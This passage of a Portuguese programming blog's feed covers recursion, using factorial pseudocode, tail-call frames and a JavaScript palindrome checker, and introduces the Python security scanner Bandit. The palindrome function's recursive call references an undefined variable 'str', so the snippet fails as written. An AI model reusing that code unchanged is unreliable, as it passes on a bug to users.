&lt;p&gt;Recursão é um método de programação no qual uma função pode chamar a si mesma. O termo é usado de maneira mais geral para descrever o processo de repetição de um objeto de um jeito similar ao que já fora mostrado. Muitos problemas em computação tem a propriedade de que cada instância sua contém uma instância menor do mesmo problema.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em termos mais práticos, é como se criássemos uma função para fatorar, e essa função chamasse a ela mesma:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;FUNÇÃO&lt;/span&gt; &lt;span class="n"&gt;fatorial&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;numero&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;RETORNE&lt;/span&gt; &lt;span class="n"&gt;numero&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;fatorial&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;numero&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;FIM&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos fazer um rápido teste de mesa. Imagine que queremos saber o fatorial de 3:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;fatorial(3)&lt;/code&gt;: Retorna &lt;code&gt;3 * fatorial(2)&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fatorial(2)&lt;/code&gt;: Retorna &lt;code&gt;2 * fatorial(1)&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Por intuição (falaremos mais sobre esse passo a seguir), assumimos que &lt;code&gt;fatorial(1) == 1&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A função chama a si mesma recursivamente em uma versão menor da entrada (&lt;code&gt;n - 1&lt;/code&gt;), e multiplica o resultado por &lt;code&gt;numero&lt;/code&gt;. Podemos visualizar o resultado desse comportamento ao fazer o caminho "de baixo para cima" na lista acima: &lt;code&gt;1 * 2 * 3 = 6&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/recursion-russian-doll.png" width="740" height="416" title="Duas referências no mesmo post. Ousado! (mashable.com)" alt="Duas referências no mesmo post. Ousado! (mashable.com)"&gt;&lt;/p&gt;
&lt;p&gt;Roubamos no exemplo anterior, quando dissemos que por intuição sabemos o resultado da última etapa. "Intuição" não funciona do ponto de vista do algoritmo, e acabaríamos com um &lt;em&gt;loop&lt;/em&gt; infinito, uma vez que não informamos em qual momento a função tem que parar de chamar a si mesma. O caso acima, se executado em uma linguagem de programação, vai resultar no famoso &lt;a href="http://ptcomputador.com/P/computer-programming-languages/88738.html" title="O que é o estouro de pilha"&gt;estouro de pilha&lt;/a&gt; (ou &lt;a href="https://pt.stackoverflow.com/questions/59135/erro-stackoverflow" title="Erro stack overflow no StackOverflow"&gt;&lt;em&gt;stack overflow&lt;/em&gt;&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Precisamos adicionar o que é conhecido por "caso base" (ou "condição de parada") ao algoritmo. É esse caso que vai determinar quando a função deve parar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;FUNÇÃO&lt;/span&gt; &lt;span class="n"&gt;fatorial&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;numero&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;SE&lt;/span&gt; &lt;span class="n"&gt;numero&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;ENTÃO&lt;/span&gt;
        &lt;span class="n"&gt;RETORNE&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="n"&gt;SENÃO&lt;/span&gt;
        &lt;span class="n"&gt;RETORNE&lt;/span&gt; &lt;span class="n"&gt;numero&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;fatorial&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;numero&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;FIM&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Podemos refazer o nosso teste de mesa:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;fatorial(3)&lt;/code&gt;: Retorna &lt;code&gt;3 * fatorial(2)&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fatorial(2)&lt;/code&gt;: Retorna &lt;code&gt;2 * fatorial(1)&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fatorial(1)&lt;/code&gt;: Retorna &lt;code&gt;1&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;É possível perceber uma estrutura que costuma se repetir em outros algoritmos que utilizam recursão:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Um número limitado de casos base;&lt;/li&gt;
&lt;li&gt;Um caso recursivo;&lt;/li&gt;
&lt;li&gt;Uma chamada externa (ex.: &lt;code&gt;fatorial(3)&lt;/code&gt;);&lt;/li&gt;
&lt;li&gt;Um conjunto de chamadas recursivas (ex.: &lt;code&gt;fatorial(3 - 1)&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Tail recursion&lt;/h2&gt;
&lt;p&gt;Voltando ao exemplo &lt;code&gt;fatorial(3)&lt;/code&gt;, uma melhor leitura da ordem de chamada seria a seguinte:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;fatorial(3)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;3 * fatorial(2)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;3 * (2 * fatorial(1))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;3 * (2 * (1))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Cada linha cria um &lt;a href="https://stackoverflow.com/questions/10057443/explain-the-concept-of-a-stack-frame-in-a-nutshell" title="Explain the concept of a stack frame in a nutshell"&gt;&lt;em&gt;stack frame&lt;/em&gt;&lt;/a&gt;, que é empilhado de acordo com a ordem das chamadas. Ao fim da última chamada recursiva, os &lt;em&gt;frames&lt;/em&gt; são retirados gradativamente da pilha, como ilustrado no exemplo abaixo:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/javascript-stack-example.png" width="740" height="243" title="Exemplo de call stack em Javascript (thinkingincrowd.me)" alt="Exemplo de call stack em Javascript (thinkingincrowd.me)"&gt;&lt;/p&gt;
&lt;p&gt;Uma função recursiva é &lt;em&gt;tail recursive&lt;/em&gt; quando a chamada recursiva é a última coisa executada pela função. No nosso exemplo, temos uma função que aparentemente possui essa característica. Porém, não é certo dizer que ela possui de fato recursão de cauda, uma vez que temos que considerar que &lt;code&gt;fatorial(numero - 1)&lt;/code&gt; é usado dentro de &lt;code&gt;fatorial(numero)&lt;/code&gt;. O exemplo abaixo passa a ideia de que a chamada da função não é a última coisa executada no &lt;em&gt;frame&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Chamada inicial: &lt;code&gt;fatorial(3)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 1: &lt;code&gt;3 * fatorial(2)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 2: &lt;code&gt;3 * (2 * fatorial(1))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 3: Atinge caso base em &lt;code&gt;fatorial(1)&lt;/code&gt; e retorna &lt;code&gt;1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 2: &lt;code&gt;3 * (2 * (1))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 1: &lt;code&gt;3 * (2)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Retorno da chamada inicial: &lt;code&gt;6&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Segundo o &lt;a href="https://www.geeksforgeeks.org/tail-recursion/" title="Tail Recursion"&gt;GeeksForGeeks&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Consider the (...) function to calculate factorial of n. It is a non-tail-recursive function. Although it looks like a tail recursive at first look. If we take a closer look, we can see that the value returned by fact(n-1) is used in fact(n), so the call to fact(n-1) is not the last thing done by fact(n)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;É preciso fazer uma manutenção no corpo da função:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;FUNÇÃO&lt;/span&gt; &lt;span class="n"&gt;fatorial&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;interna&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;numero&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;acumulador&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;SE&lt;/span&gt; &lt;span class="n"&gt;numero&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;ENTÃO&lt;/span&gt;
        &lt;span class="n"&gt;RETORNE&lt;/span&gt; &lt;span class="n"&gt;acumulador&lt;/span&gt;
    &lt;span class="n"&gt;SENÃO&lt;/span&gt;
        &lt;span class="n"&gt;RETORNE&lt;/span&gt; &lt;span class="n"&gt;fatorial&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;interna&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;numero&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;numero&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;acumulador&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;FUNÇÃO&lt;/span&gt; &lt;span class="n"&gt;fatorial&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;numero&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;RETORNE&lt;/span&gt; &lt;span class="n"&gt;fatorial&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;interna&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;numero&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;FIM&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como resultado, teremos um &lt;em&gt;call stack&lt;/em&gt; diferente:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Chamada inicial: &lt;code&gt;fatorial(3)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 1: &lt;code&gt;fatorial-interna(3, 1)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 2: &lt;code&gt;fatorial-interna(2, 3)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 3: &lt;code&gt;fatorial-interna(1, 6)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 4: Atinge caso base em &lt;code&gt;fatorial-interna(0, 6)&lt;/code&gt; e retorna &lt;code&gt;6&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 3: Retorno de &lt;code&gt;6&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 2: Retorno de &lt;code&gt;6&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 1: Retorno de &lt;code&gt;6&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Retorno da chamada inicial: &lt;code&gt;6&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Qual a real motivação em utilizar funções com recursão de cauda? Esse tipo de função pode ser otimizada pelo interpretador/compilador, portanto, o seu uso é encorajado em &lt;a href="https://www.quora.com/Which-programming-languages-support-tail-recursion-optimization-out-of-the-box" title="Which programming languages support tail recursion optimization out of the box?"&gt;linguagens que suportam essa funcionalidade&lt;/a&gt;. De forma bem resumida, uma vez que a chamada recursiva é o último "statement", não há nada mais para ser executado pela função corrente, podendo utilizar o mesmo &lt;em&gt;stack frame&lt;/em&gt;, &lt;a href="https://www.geeksforgeeks.org/tail-call-elimination/" title="Tail Call Elimination"&gt;minimizando o esforço de empilhar e desempilhar chamadas&lt;/a&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Chamada inicial: &lt;code&gt;fatorial(3)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 1: &lt;code&gt;fatorial-interna(3, 1)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 1: &lt;code&gt;fatorial-interna(2, 3)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 1: &lt;code&gt;fatorial-interna(1, 6)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Frame 1: Atinge caso base em &lt;code&gt;fatorial-interna(0, 6)&lt;/code&gt; e retorna &lt;code&gt;6&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Retorno da chamada inicial: &lt;code&gt;6&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Na prática&lt;/h2&gt;
&lt;p&gt;Vamos para uma abordagem mais prática, e para esse bloco, nada melhor que um dos desafios mais populares em entrevistas de emprego: Determinar se uma palavra é palíndromo.&lt;/p&gt;
&lt;p&gt;Segundo o &lt;a href="https://www.todamateria.com.br/palindromo/" title="Palíndromo"&gt;TodaMatéria&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Palíndromo, do grego palin (novo) e dromo (percurso), é toda palavra ou frase que pode ser lida de trás pra frente e que, independente da direção, mantém o seu sentido.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Vamos nos ater apenas à palavra. Utilizando a ideia de dividir e conquistar, é possível imaginar o seguinte algoritmo:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Dividir:&lt;/strong&gt; Recebo determinada palavra, ou qualquer fração da mesma (exemplo: &lt;code&gt;arara&lt;/code&gt;, &lt;code&gt;rar&lt;/code&gt;, &lt;code&gt;a&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Conquistar:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Se a largura da palavra for igual a &lt;code&gt;1&lt;/code&gt; (exemplo: &lt;code&gt;a&lt;/code&gt;), é palíndromo. Esse é um caso base;&lt;/li&gt;
&lt;li&gt;Senão, se primeira e última letra da palavra forem diferentes (exemplo: &lt;code&gt;araro&lt;/code&gt;), não é palíndromo. Esse é o segundo caso base;&lt;/li&gt;
&lt;li&gt;Senão, retiramos a primeira e última letra da palavra, e passamos a nova palavra como parâmetro recursivamente (exemplo: &lt;code&gt;rar&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Combinar:&lt;/strong&gt; O resultado do último caso base executado vai dizer se o parâmetro passado é palíndromo ou não.&lt;/p&gt;
&lt;p&gt;Em &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;, podemos reproduzir as condições acima da seguinte forma:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;isPalindrome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;word&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;// Caso base #1&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;word&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="c1"&gt;// Caso base #2&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;word&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;slice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="nx"&gt;word&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;slice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="c1"&gt;// Chamada recursiva&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;isPalindrome&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;str&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;slice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acredito que deixando a chamada recursiva para o final, além de ser mais fácil de imaginar o problema e seus diferentes casos, "ganhamos" a característica de &lt;em&gt;tail recursion&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Recursividade sempre é um assunto que demanda um pouco mais de energia na leitura de um código, principalmente se você (assim como eu) prefere a forma iterativa (com &lt;code&gt;for&lt;/code&gt; ou &lt;code&gt;while&lt;/code&gt; e utilizando uma &lt;code&gt;stack&lt;/code&gt; como estrutura de dados), mas sem dúvida alguma que compreender o &lt;em&gt;divide and conquer&lt;/em&gt; e praticar uma forma mais estruturada de pensar facilita na compreensão de problemas com recursão.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.geeksforgeeks.org/divide-and-conquer-algorithm-introduction/"&gt;GeeksForGeeks - Divide and Conquer Algorithm. Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.geeksforgeeks.org/tail-recursion/"&gt;GeeksForGeeks - Tail recursion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pt.khanacademy.org/computing/computer-science/algorithms/recursive-algorithms/a/recursion"&gt;Khan Academy - Recursividade&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cs.stackexchange.com/questions/6230/what-is-tail-recursion"&gt;StackExchange - What is tail recursion?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.tutorialspoint.com/data_structures_algorithms/divide_and_conquer.htm"&gt;TutorialsPoint - Divide and Conquer&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pt.wikibooks.org/wiki/Algoritmos_e_Estruturas_de_Dados/Recursividade"&gt;Wikibooks - Algoritmos e Estruturas de Dados/Recursividade&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pt.wikipedia.org/wiki/Recursividade_(ci%C3%AAncia_da_computa%C3%A7%C3%A3o)"&gt;Wikipedia - Recursividade (ciência da computação)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="estrutura-de-dados. algoritmos"></category><category term="recursividade"></category><category term="divide-and-conquer"></category></entry><entry><title>Assegure a qualidade do seu código Python - Bandit</title><link href="https://klauslaube.com.br/2019/02/21/assegure-qualidade-seu-codigo-python-bandit.html" rel="alternate"></link><published>2019-02-21T12:45:00-03:00</published><updated>2019-02-21T12:45:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-02-21:/2019/02/21/assegure-qualidade-seu-codigo-python-bandit.html</id><summary type="html">&lt;p&gt;Já falamos sobre algumas ferramentas de qualidade de código &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; aqui no &lt;em&gt;blog&lt;/em&gt;. De &lt;a href="https://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep.html" title="Assegure a qualidade do seu código Python - pep8"&gt;&lt;em&gt;pycodestyle&lt;/em&gt;&lt;/a&gt; a &lt;a href="https://klauslaube.com.br/2011/10/16/assegure-qualidade-seu-codigo-python-clone-digger.html" title="Assegure a qualidade do seu código Python - Clone digger"&gt;&lt;em&gt;Clone Digger&lt;/em&gt;&lt;/a&gt;, passando por &lt;a href="https://klauslaube.com.br/2011/10/02/assegure-qualidade-seu-codigo-python-pyflakes.html" title="Assegure a qualidade do seu código Python - Pyflakes"&gt;&lt;em&gt;Pyflakes&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/2011/09/06/assegura-a-qualidade-de-codigo-python-pylint.html" title="Assegure a qualidade do seu código Python - Pylint"&gt;&lt;em&gt;Pylint&lt;/em&gt;&lt;/a&gt;. Além do &lt;em&gt;flake8&lt;/em&gt; (que acredito não precisar de apresentações), uma ferramenta que passei a ter sempre no meu &lt;em&gt;toolbelt&lt;/em&gt; foi o &lt;a href="https://github.com/PyCQA/bandit" title="Repositório do Bandit"&gt;&lt;em&gt;Bandit&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Na verdade, ele não é …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Já falamos sobre algumas ferramentas de qualidade de código &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; aqui no &lt;em&gt;blog&lt;/em&gt;. De &lt;a href="https://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep.html" title="Assegure a qualidade do seu código Python - pep8"&gt;&lt;em&gt;pycodestyle&lt;/em&gt;&lt;/a&gt; a &lt;a href="https://klauslaube.com.br/2011/10/16/assegure-qualidade-seu-codigo-python-clone-digger.html" title="Assegure a qualidade do seu código Python - Clone digger"&gt;&lt;em&gt;Clone Digger&lt;/em&gt;&lt;/a&gt;, passando por &lt;a href="https://klauslaube.com.br/2011/10/02/assegure-qualidade-seu-codigo-python-pyflakes.html" title="Assegure a qualidade do seu código Python - Pyflakes"&gt;&lt;em&gt;Pyflakes&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/2011/09/06/assegura-a-qualidade-de-codigo-python-pylint.html" title="Assegure a qualidade do seu código Python - Pylint"&gt;&lt;em&gt;Pylint&lt;/em&gt;&lt;/a&gt;. Além do &lt;em&gt;flake8&lt;/em&gt; (que acredito não precisar de apresentações), uma ferramenta que passei a ter sempre no meu &lt;em&gt;toolbelt&lt;/em&gt; foi o &lt;a href="https://github.com/PyCQA/bandit" title="Repositório do Bandit"&gt;&lt;em&gt;Bandit&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Na verdade, ele não é exatamente um &lt;em&gt;code linter&lt;/em&gt;, mas sim uma ferramenta para testar a segurança do seu projeto &lt;em&gt;Python&lt;/em&gt;. Em tempos onde cada vez mais somos expostos a falhas de segurança em aplicações, e tais falhas podem ser um fator crucial para o fracasso de um negócio, cuidado nunca é demais.&lt;/p&gt;
&lt;h2&gt;O seguro morreu de velho&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Bandit&lt;/em&gt; é uma ferramenta construída para encontrar problemas comuns de segurança em projetos &lt;em&gt;Python&lt;/em&gt;. Livre e de código aberto (&lt;a href="https://github.com/PyCQA/bandit/blob/master/LICENSE" title="Leia mais no repositório da ferramenta"&gt;&lt;em&gt;Apache 2&lt;/em&gt;&lt;/a&gt;), está disponível para instalação através do &lt;code&gt;pip&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install bandit
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Uma vez instalado, basta executá-lo através do terminal:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ bandit -r caminho-para-projeto-python
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note que o parâmetro &lt;code&gt;-r&lt;/code&gt; acima instrui o utilitário a executar de forma recursiva, iterando sobre todos os arquivos e pastas dentro do caminho especificado. Outro parâmetro comum é o &lt;code&gt;-t&lt;/code&gt;, onde é possível especificar quais testes você quer executar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ bandit -r ~/Workspace/klaus/blog -t B101,B102
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;em&gt;Bandit&lt;/em&gt; considera como vulnerabilidades desde o uso de &lt;code&gt;assert&lt;/code&gt; (B101), passando pelo uso de &lt;code&gt;eval&lt;/code&gt; (B307), até possíveis brechas para &lt;em&gt;SQL injection&lt;/em&gt; (B608). Uma lista completa de todos os &lt;em&gt;plugins&lt;/em&gt; está disponível na &lt;a href="https://bandit.readthedocs.io/en/latest/plugins/index.html#complete-test-plugin-listing" title="Confira a lista de falhas cobertas pelo Bandit"&gt;documentação oficial&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/bandit.jpg" width="630" height="336" title="Segurança na web é como fazer parte do filme Agarra-me Se Puderes (adorocinema.com)" alt="Segurança na web é como fazer parte do filme Agarra-me Se Puderes (adorocinema.com)"&gt;&lt;/p&gt;
&lt;p&gt;Se você utiliza &lt;em&gt;pytest&lt;/em&gt; para escrever os seus testes, o item B101 pode ser um problema, uma vez que é normal utilizar &lt;code&gt;assert&lt;/code&gt; ao invés do convencional &lt;code&gt;self.assertEquals&lt;/code&gt;. Nesse caso, uma das formas de contornar esse comportamento é ignorando os testes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ bandit -r . -x tests/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Também é possível ter um arquivo de configuração (&lt;code&gt;.bandit&lt;/code&gt;) na raíz do seu projeto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[bandit]&lt;/span&gt;
&lt;span class="na"&gt;exclude: tests&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para finalizar, através do parâmetro &lt;code&gt;-f&lt;/code&gt; é possível emitir a saída em diferentes formatos, como &lt;em&gt;CSV&lt;/em&gt;, &lt;em&gt;HTML&lt;/em&gt;, &lt;em&gt;JSON&lt;/em&gt;, &lt;em&gt;XML&lt;/em&gt; e &lt;em&gt;YAML&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
